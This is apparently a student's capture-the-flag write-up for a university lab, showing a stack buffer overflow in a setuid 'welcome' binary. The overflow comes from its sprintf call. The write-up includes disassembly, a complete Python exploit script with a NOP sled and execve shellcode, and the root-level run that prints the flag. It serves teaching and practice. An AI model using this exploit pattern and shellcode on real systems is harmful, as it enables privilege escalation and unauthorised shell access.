# Mission Impossible 1
During this writeup I disconnected and reconnected a lot because I couldn't keep writing and solving this at the same time and the binary would change. 

First we ssh into the server 
```bash
ssh agent@shell.hackintro25.di.uoa.gr -p 58779
```

We are greeted with a bomb and a timer:
```bash
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


####### #     # #######         ######  ####### #     # ######
   #    #     # #               #     # #     # ##   ## #     #
   #    #     # #               #     # #     # # # # # #     #
   #    ####### #####           ######  #     # #  #  # ######
   #    #     # #               #     # #     # #     # #     #
   #    #     # #               #     # #     # #     # #     #
   #    #     # #######         ######  ####### #     # ######

                          . . .                         
                           \|/                          
                         `--+--'                        
                           /|\                          
                          ' | '                         
                            |                           
                            |                           
                        ,--'#`--.                       
                        |#######|                       
                     _.-'#######`-._                    
                  ,-'###############`-.                 
                ,'#####################`,               
               /#########################\              
              |###########################|             
             |#############################|            
             |#############################|            
             |#############################|            
             |#############################|            
              |###########################|             
               \#########################/              
                `.#####################,'               
                  `._###############_,'                 
                     `--..#####..--'      

      Clock's ticking ... I hope you know how to overflow


agent@1c4696c81004[00:09:26]:/bomb$
```


Running `ls -la` we can see 2 files `flag` and the `welcome` executable:
```bash
agent@1c4696c81004[00:09:04]:/bomb$ ls -la
total 28
drwx---r-x 2 root   root    4096 Apr 29 20:48 .
drwxr-xr-x 1 root   root    4096 Apr 29 20:48 ..
-rw-r----- 1 secret secret    67 Apr 29 20:48 flag
-rwsr-sr-x 1 secret secret 15236 Apr 29 20:48 welcome
```
Running checksec:
```bash
agent@0f1aab9023f2[00:09:17]:/bomb$ checksec --file=welcome
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	SymbolsFORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   48 Symbols	  No	0		2		welcome
```

Let's run the program:
```bash
agent@1c4696c81004[00:07:50]:/bomb$ ./welcome
Usage: ./welcome [name]
agent@1c4696c81004[00:07:26]:/bomb$ ./welcome Ilias
Welcome, Ilias!
```

Running `objdump -d welcome` we can see `vuln` getting called:
```bash
    12ba:	8b 00                	mov    (%eax),%eax
    12bc:	83 ec 0c             	sub    $0xc,%esp
    12bf:	50                   	push   %eax
    12c0:	e8 18 ff ff ff       	call   11dd <vuln>
    12c5:	83 c4 10             	add    $0x10,%esp
    12c8:	b8 00 00 00 00       	mov    $0x0,%eax
    12cd:	8d 65 f8             	lea    -0x8(%ebp),%esp
```

If we go to `vuln`:
```bash
000011dd <vuln>:
    11dd:	55                   	push   %ebp
    11de:	89 e5                	mov    %esp,%ebp
    11e0:	53                   	push   %ebx
    11e1:	81 ec 24 01 00 00    	sub    $0x124,%esp
    11e7:	e8 f4 fe ff ff       	call   10e0 <__x86.get_pc_thunk.bx>
    11ec:	81 c3 08 2e 00 00    	add    $0x2e08,%ebx
    11f2:	83 ec 04             	sub    $0x4,%esp
    11f5:	ff 75 08             	push   0x8(%ebp)
    11f8:	8d 83 14 e0 ff ff    	lea    -0x1fec(%ebx),%eax
    11fe:	50                   	push   %eax
    11ff:	8d 85 e1 fe ff ff    	lea    -0x11f(%ebp),%eax
    1205:	50                   	push   %eax
    1206:	e8 75 fe ff ff       	call   1080 <sprintf@plt>
    120b:	83 c4 10             	add    $0x10,%esp
    120e:	83 ec 0c             	sub    $0xc,%esp
    1211:	8d 85 e1 fe ff ff    	lea    -0x11f(%ebp),%eax
    1217:	50                   	push   %eax
    1218:	e8 53 fe ff ff       	call   1070 <puts@plt>
    121d:	83 c4 10             	add    $0x10,%esp
    1220:	8b 83 f4 ff ff ff    	mov    -0xc(%ebx),%eax
    1226:	8b 00                	mov    (%eax),%eax
    1228:	83 ec 0c             	sub    $0xc,%esp
    122b:	50                   	push   %eax
    122c:	e8 1f fe ff ff       	call   1050 <fflush@plt>
    1231:	83 c4 10             	add    $0x10,%esp
    1234:	90                   	nop
    1235:	8b 5d fc             	mov    -0x4(%ebp),%ebx
    1238:	c9                   	leave
    1239:	c3                   	ret
```

Why is this function called `vuln`? Because of `sprintf`.
Now this is important information in this problem we only had 10
minutes and every time we logged out the binary reset. 
The way I worked around this challenge is everytime I would login 
I would instantly run `objdump -d welcome` to find the offset 
`lea    -0x11f(%ebp),%eax` here I would take the `0x11f = 287`
after that I would run `gdb ./welcome` and then `run `python3 -c 'print("A"*287 + "BBBB")'``.

The offset needed adjusting usually removing 5 bytes worked so in this case it is `"A"*282 + "BBBB"`.

Now for picking the address... after running it many times in gdb `x/20x $esp-4` we can 
see that we are in the 0xff... region of the stack so we have to pick a random address from there.

Crafting the payload (When I solved it the number I found in lea was 55 so 55 - 5 = 50.):
```python3
#!/usr/bin/env python3

import sys
import struct

payload = b""
payload += b"B" * 50
payload += struct.pack("<I", 0xffaf446c)
payload += b"\x90" * 100000
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"  # Shellcode

sys.stdout.buffer.write(payload)
```
Important for creating `exploit.py` I worked in the `/tmp` folder.
The payload can be crafted using the program above:
```bash
python3 exploit.py > payload
```

And now we run it a lot of times the nopsled is very big on purpose and the shellcode was from the slides:
```bash
agent@633a90004b3c[00:03:26]:/tmp$ /bomb/welcome `cat payload`
Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBlD����������������������������������������������������������������������������������������...(many more...)...������1�Ph//shh/bin����°
                                              1�@̀!
$ ls  
exploit.py  nop_sled.bin  payload
$ cd /bomb
$ cat flag
ea99b36216b186b217814af20d426eb4_I_know_one_thing_I_know_overflows
```
This was after about 30 runs.

I tried other ways too like exporting enviroment variables but they didn't work because this would happen:
```bash
getconf ARG_MAX
2097152
agent@95ccfa57c027[00:09:38]:/bomb$ export NOP=python3 -c 'print("\x90"*100000)'
agent@95ccfa57c027[00:09:38]:/bomb$ TRAPALRM:1: argument list too long: date
```

I'm not really sure why that happened I could tell date was being called but the conclusion I reached was that
the kernel rejected it would like running `execve` with `date` as
an argument and passing the `env` too, but `env` was too large.
In theory creating NOP variables would be a lot faster, but in the
end it was easier to just create that simple payload.
